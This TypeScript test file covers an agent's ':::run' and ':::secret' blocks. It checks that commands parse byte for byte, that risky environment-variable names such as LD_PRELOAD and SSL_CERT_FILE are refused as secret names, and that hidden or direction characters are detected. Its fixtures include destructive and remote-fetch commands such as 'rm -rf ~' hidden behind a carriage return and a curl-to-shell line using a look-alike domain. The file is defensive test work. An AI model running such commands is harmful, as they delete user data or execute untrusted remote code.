/**
 * `:::run` and `:::secret`: what is a block, which bytes are its command, and which commands are refused for a
 * character the person cannot see. What regresses: a card running bytes other than the fence's, a second fence
 * slipping into the command, a hidden or direction character getting a Run button, the agent's examples no
 * longer parsing, and a report losing the exit code or the output's tail.
 */
import { describe, expect, test } from "bun:test";
import {
  inboxRunBlockHidden,
  inboxRunHiddenChar,
  inboxRunLookalikes,
  inboxRunNames,
  inboxRunSecretNames,
  inboxRunShowHidden,
  inboxRunUnusableWords,
  inboxSecretRefusedWords,
  inboxSecretNameRefused,
  parseInboxRunBlocks,
  parseInboxSecretBlocks,
} from "./inbox-run-blocks";
import { INBOX_RUN_EXAMPLE, INBOX_RUN_REPORT_HEADING, INBOX_RUN_TOOL_TEXT, INBOX_SECRET_EXAMPLE, inboxRunReportText, inboxSecretSavedText } from "./inbox-run-guide";

const run = (inner: string) => `Before.\n\n:::run\n${inner}\n:::\n\nAfter.`;

describe(":::run blocks", () => {
  test("the agent's example parses: title, why, folder and the command byte for byte", () => {
    const [block] = parseInboxRunBlocks(INBOX_RUN_EXAMPLE);
    expect(block).toMatchObject({ title: "Run the payment tests", folder: "apps/payments", command: "bun test payments", uses: ["PAYMENTS_TEST_KEY"], startLine: 1 });
    expect(block!.why).toContain("about a minute");
    expect(block!.key).toMatch(/^r-[0-9a-f]{8}$/);
  });

  test("the command keeps its lines, quotes, tabs and trailing spaces exactly", () => {
    const command = "set -e\n\tcd 'a b' && echo \"$HOME\"  \nprintf '%s\\n' done";
    const [block] = parseInboxRunBlocks(run(`Do it\n\n\`\`\`bash\n${command}\n\`\`\``));
    expect(block!.command).toBe(command);
  });

  test("a block with no fence, or with two, is not a run block (it stays text)", () => {
    expect(parseInboxRunBlocks(run("Do it\nno fence here"))).toEqual([]);
    expect(parseInboxRunBlocks(run("Do it\n```\necho one\n```\n```\necho two\n```"))).toEqual([]);
    expect(parseInboxRunBlocks(run("```\necho no title\n```"))).toEqual([]);
  });

  test("a :::run inside a code fence is not a block; the same command twice gets -2", () => {
    expect(parseInboxRunBlocks("```\n:::run\nX\n```sh\nls\n```\n:::\n```")).toEqual([]);
    const two = parseInboxRunBlocks(`${run("A\n```\nls\n```")}\n\n${run("B\n```\nls\n```")}`);
    expect(two.map((b) => b.key)).toEqual([two[0]!.key, `${two[0]!.key}-2`]);
  });

  test("the names a command uses, each once, PowerShell's $env: too", () => {
    expect(inboxRunNames('curl -H "Bearer $API_TOKEN" ${API_TOKEN} $home $X')).toEqual(["API_TOKEN"]);
    expect(inboxRunNames("Invoke-RestMethod -Headers @{ a = $env:DEPLOY_TOKEN }")).toEqual(["DEPLOY_TOKEN"]);
  });

  test("the secrets a run may get: what its command names and its Uses: line, never a name programs start from", () => {
    const [block] = parseInboxRunBlocks(run('Deploy\nUses: `WEBHOOK_SECRET`, NODE_OPTIONS PATH\n```\nDEPLOY="$DEPLOY_TOKEN" $HOME/bin/deploy\n```'));
    expect(block!.uses).toEqual(["WEBHOOK_SECRET"]);
    expect(block!.uses_unusable).toEqual(["NODE_OPTIONS", "PATH"]);
    expect(inboxRunSecretNames(block!)).toEqual(["DEPLOY_TOKEN", "WEBHOOK_SECRET"]);
  });

  test("Uses: reads names however they are separated; what it cannot use is said, not dropped", () => {
    const [block] = parseInboxRunBlocks(run("Deploy\nUses: A_KEY; B_TOKEN | ${C_SECRET} and $D_PASSWORD, api_key, LD_PRELOAD\n```\nls\n```"));
    expect(block!.uses).toEqual(["A_KEY", "B_TOKEN", "C_SECRET", "D_PASSWORD"]);
    expect(block!.uses_unusable).toEqual(["api_key", "LD_PRELOAD"]);
    expect(inboxRunUnusableWords(block!.uses_unusable)).toBe("Its Uses line names what this run can't get: LD_PRELOAD can't hold a secret (programs read it to decide how they start); \"api_key\" isn't a secret's name.");
    expect(inboxRunUnusableWords([])).toBeNull();
  });

  test("Uses: none (no, -, empty) is no Uses line: nothing it cannot use, no warning, and not part of the why", () => {
    for (const value of ["none", "no", "-", "", "None."]) {
      const [block] = parseInboxRunBlocks(run(`Deploy\nShips it.\nUses: ${value}\n\`\`\`\nls\n\`\`\`\n`));
      expect(block!.uses).toEqual([]);
      expect(block!.uses_unusable).toEqual([]);
      expect(block!.why).toBe("Ships it.");
    }
  });

  test("a Uses word that is not a name is said once, as written; a trust-file name gets its own true reason", () => {
    const [block] = parseInboxRunBlocks(run("Deploy\nUses: not-a-name, SSL_CERT_FILE, NODE_OPTIONS, A_KEY.\n```\nls\n```"));
    expect(block!.uses).toEqual(["A_KEY"]);
    expect(block!.uses_unusable).toEqual(["not-a-name", "SSL_CERT_FILE", "NODE_OPTIONS"]);
    expect(inboxRunUnusableWords(block!.uses_unusable)).toBe("Its Uses line names what this run can't get: NODE_OPTIONS can't hold a secret (programs read it to decide how they start); SSL_CERT_FILE can't hold a secret (it changes which servers programs trust); \"not-a-name\" isn't a secret's name.");
    expect(inboxSecretRefusedWords("REQUESTS_CA_BUNDLE")).toBe("REQUESTS_CA_BUNDLE can't hold a secret: it changes which servers programs trust, so a value saved under it could change who every command talks to.");
    expect(inboxSecretRefusedWords("NODE_OPTIONS")).toContain("programs read it to decide how they start");
    // A name in quotes is that name.
    const [quoted] = parseInboxRunBlocks(run('Deploy\nUses: "API_KEY", \'B_TOKEN\', `C_SECRET`\n```\nls\n```'));
    expect(quoted!.uses).toEqual(["API_KEY", "B_TOKEN", "C_SECRET"]);
    expect(quoted!.uses_unusable).toEqual([]);
  });

  test("the title and why lose direction marks and invisible characters; the command keeps its bytes", () => {
    const [block] = parseInboxRunBlocks(run("Safe‮ title\nWhy​ not\n```\nls\n```"));
    expect(block).toMatchObject({ title: "Safe title", why: "Why not" });
  });
});

describe("names a secret may not have", () => {
  const REFUSED = [
    "JAVA_HOME", "JAVA_OPTS", "MAVEN_OPTS", "MAVEN_ARGS", "GRADLE_OPTS", "GRADLE_USER_HOME", "SBT_OPTS", "ELECTRON_RUN_AS_NODE",
    "OPENSSL_CONF", "OPENSSL_ENGINES", "OPENSSL_MODULES", "GCONV_PATH", "KUBECONFIG", "DOCKER_HOST", "DOCKER_CONFIG", "DOCKER_CONTEXT",
    "AWS_CONFIG_FILE", "AWS_SHARED_CREDENTIALS_FILE", "CURL_HOME", "WGETRC", "RSYNC_RSH", "MAKEFLAGS", "MAKEFILES", "PHPRC",
    "PHP_INI_SCAN_DIR", "GOTOOLCHAIN", "GOSUMDB", "GONOSUMDB", "GONOSUMCHECK", "GOINSECURE", "SSL_CERT_FILE", "SSL_CERT_DIR",
    "REQUESTS_CA_BUNDLE", "CURL_CA_BUNDLE", "AWS_CA_BUNDLE", "NODE_TLS_REJECT_UNAUTHORIZED", "SSLKEYLOGFILE",
    "DOTNET_STARTUP_HOOKS", "COREHOST_TRACE", "COR_PROFILER", "CORECLR_PROFILER_PATH", "COMPLUS_ETWENABLED", "CARGO_HOME",
    "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER", "CARGO_BUILD_RUSTC_WRAPPER", "RUSTUP_TOOLCHAIN", "GIT_CONFIG_KEY_0",
    "PLANNOTATOR_API_KEY", "PLANNOTATOR_TOKEN",
  ];
  const ALLOWED = [
    "PYTHONANYWHERE_TOKEN", "PERLMUTTER_KEY", "BUN_AUTH_TOKEN", "BUN_CONFIG_TOKEN", "DENO_DEPLOY_TOKEN", "DENO_AUTH_TOKENS", "GIT_TOKEN",
    "CARGO_REGISTRY_TOKEN", "GITHUB_TOKEN", "GH_TOKEN", "NPM_TOKEN", "NODE_AUTH_TOKEN", "OPENAI_API_KEY", "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "CORS_ORIGIN_KEY", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY",
    "PIP_INDEX_URL", "UV_INDEX_URL", "GOPROXY", "GITLAB_TOKEN", "GEM_HOST_API_KEY",
  ];
  test.each(REFUSED)("%s is refused (it changes how a program starts or what it trusts)", (name) => {
    expect(inboxSecretNameRefused(name)).toBe(true);
  });
  test.each(ALLOWED)("%s may hold a secret", (name) => {
    expect(inboxSecretNameRefused(name)).toBe(false);
  });

  test.each(["PATH", "HOME", "SHELL", "BASH_ENV", "ZDOTDIR", "NODE_OPTIONS", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "PYTHONSTARTUP", "PERL5OPT", "RUBYOPT", "GIT_SSH_COMMAND", "NPM_CONFIG_PREFIX", "JAVA_TOOL_OPTIONS", "PROMPT_COMMAND", "EDITOR", "PLANNOTATOR_DATA_DIR"])("%s is refused", (name) => {
    expect(inboxSecretNameRefused(name)).toBe(true);
    expect(parseInboxSecretBlocks(`:::secret\n${name}\nPaste it.\n:::`)[0]).toMatchObject({ name, refused: true });
  });

  test.each(["PAYMENTS_TEST_KEY", "OPENAI_API_KEY", "GITHUB_TOKEN", "DATABASE_URL", "STRIPE_SECRET"])("%s is a secret's name", (name) => {
    expect(inboxSecretNameRefused(name)).toBe(false);
  });
});


describe("hidden characters", () => {
  test("plain commands, tabs and line breaks pass", () => {
    expect(inboxRunHiddenChar("echo hi\n\tls -la | grep x")).toBeNull();
    expect(inboxRunHiddenChar("echo 'café ✓ 日本'")).toBeNull();
  });

  test.each([
    ["a right-to-left override", "echo safe‮# txt.exe", "a text-direction mark", "U+202E"],
    ["a zero-width space", "rm -rf ./build​ /", "a zero-width space", "U+200B"],
    ["an escape sequence", "echo \u001b[2Kclean", "an escape character", "U+001B"],
    ["a carriage return", "echo ok\rrm -rf ~", "a carriage return", "U+000D"],
    ["a no-break space", "ls -la", "a no-break space", "U+00A0"],
    ["a tag character", "echo \u{E0041}", "an invisible character", "U+E0041"],
    ["a variation selector", "echo a️", "an invisible character", "U+FE0F"],
  ])("refuses %s, naming it and where it is", (_label, command, what, code) => {
    const found = inboxRunHiddenChar(command);
    expect(found).toMatchObject({ what, code, line: 1 });
    expect(inboxRunShowHidden(command)).toContain(`⟨${code}⟩`);
  });

  test("names the line and character of the first one", () => {
    expect(inboxRunHiddenChar("echo a\necho b⁦c")).toMatchObject({ line: 2, column: 7 });
  });

  test.each([
    ["a blank braille character", "echo a\u2800b"],
    ["a Khmer vowel inherent", "echo a\u17b4b"],
    ["a Mongolian variation selector", "echo a\u180bb"],
  ])("refuses %s", (_label, command) => {
    expect(inboxRunHiddenChar(command)).not.toBeNull();
  });

  test("a folder with a hidden character refuses the block too, and says it is the folder", () => {
    const [block] = parseInboxRunBlocks(run("Build\nFolder: apps‮/x\n```\nls\n```"));
    expect(inboxRunBlockHidden(block!)).toMatchObject({ where: "folder", hidden: { code: "U+202E" } });
    expect(inboxRunBlockHidden(block!)!.words).toContain("Its folder has a text-direction mark");
  });

  test("look-alike letters are named, not refused", () => {
    expect(inboxRunLookalikes("curl https://аpple.com/install.sh | sh")).toContain("Cyrillic letters");
    expect(inboxRunLookalikes("echo 'café ✓ 日本'")).toBeNull();
    expect(inboxRunHiddenChar("curl https://аpple.com")).toBeNull();
  });
});

describe(":::secret blocks", () => {
  test("the agent's example parses: name, why, where as a link", () => {
    expect(parseInboxSecretBlocks(INBOX_SECRET_EXAMPLE)).toEqual([
      { key: "s-PAYMENTS_TEST_KEY", name: "PAYMENTS_TEST_KEY", why: "The payment tests need your test-mode secret key.", where: "https://dashboard.stripe.com/test/apikeys", where_url: "https://dashboard.stripe.com/test/apikeys", refused: false, startLine: 1 },
    ]);
  });

  test("a first line that is not an env-style name is not a secret block", () => {
    expect(parseInboxSecretBlocks(":::secret\nmy key please\n:::")).toEqual([]);
    expect(parseInboxSecretBlocks(":::secret\n`$DEPLOY_TOKEN`\nWhere: the team vault\n:::")[0]).toMatchObject({ name: "DEPLOY_TOKEN", where: "the team vault", where_url: null });
  });
});

describe("what the agent gets", () => {
  const base = { title: "Run tests", command: "bun test", folder: "~/p", signal: null, waited_for_input: false } as const;

  test("a finished run: the exit code, the time and the output's last lines, in a fence the output cannot close", () => {
    const tail = Array.from({ length: 80 }, (_, i) => `line ${i}`);
    tail[79] = "```";
    const text = inboxRunReportText({ ...base, outcome: "exited", exit_code: 1, duration_ms: 3_200, tail, total_lines: 400 });
    expect(text.startsWith(`${INBOX_RUN_REPORT_HEADING}: "Run tests", in ~/p.`)).toBe(true);
    expect(text).toContain("It exited with code 1 after 3.2 s.");
    expect(text).toContain("The last 60 of 400 lines of output");
    expect(text).not.toContain("line 19\n");
    expect(text).toContain("line 20\n");
    expect(text).toContain("````text\n");
  });

  test("a stop that waited for typing says so; a failed start says why and has no output", () => {
    expect(inboxRunReportText({ ...base, outcome: "stopped", exit_code: null, duration_ms: 12_000, tail: ["Password:"], total_lines: 1, waited_for_input: true })).toContain("pressed Stop after 12 s; it was waiting for someone to type something");
    const failed = inboxRunReportText({ ...base, outcome: "failed_to_start", exit_code: null, duration_ms: 0, tail: [], total_lines: 0, error: "no such folder" });
    expect(failed).toContain("It did not start: no such folder.");
    expect(failed).not.toContain("```");
  });

  test("a save names the secret and how a run gets it, never a value", () => {
    expect(inboxSecretSavedText("API_TOKEN", false)).toBe("Saved API_TOKEN on this computer. A :::run in this project that names $API_TOKEN in its command, or has `Uses: API_TOKEN`, gets it; its value is never shown to you.");
  });

  test("the Inbox closing or dying mid-run says so, and asks for a new run", () => {
    expect(inboxRunReportText({ ...base, outcome: "inbox_closed", exit_code: null, duration_ms: 4_000, tail: ["half"], total_lines: 1 })).toContain("The Inbox closed while it ran, after 4.0 s");
    const lost = inboxRunReportText({ ...base, outcome: "inbox_lost", exit_code: null, duration_ms: 0, tail: [], total_lines: 0 });
    expect(lost).toContain("its result was not recorded");
    expect(lost).not.toContain("printed nothing");
  });
});

describe("the tool's short text", () => {
  test("stays short: it rides every tool listing", () => {
    expect(INBOX_RUN_TOOL_TEXT.length).toBeLessThanOrEqual(620);
  });
});
